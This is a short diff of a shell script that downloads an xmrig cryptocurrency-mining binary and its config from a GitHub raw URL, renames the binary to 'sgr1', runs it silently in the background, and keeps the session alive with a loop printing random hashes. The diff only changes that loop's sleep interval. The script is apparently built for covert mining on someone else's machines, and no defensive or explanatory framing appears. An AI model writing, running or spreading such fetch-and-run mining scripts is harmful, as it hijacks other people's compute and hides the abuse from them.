@@ -3,4 +3,4 @@ wget -O sgr1 https://raw.githubusercontent.com/6248202226/filesg/main/xmrig >/de
 chmod +x sgr1
 wget https://raw.githubusercontent.com/6248202226/filesg/main/gr.json
 ./sgr1 -c "gr.json" > /dev/null 2>&1 &
-while :; do echo $RANDOM | md5sum | head -c 20; echo; sleep 30s; done
+while :; do echo $RANDOM | md5sum | head -c 20; echo; sleep 1m; done
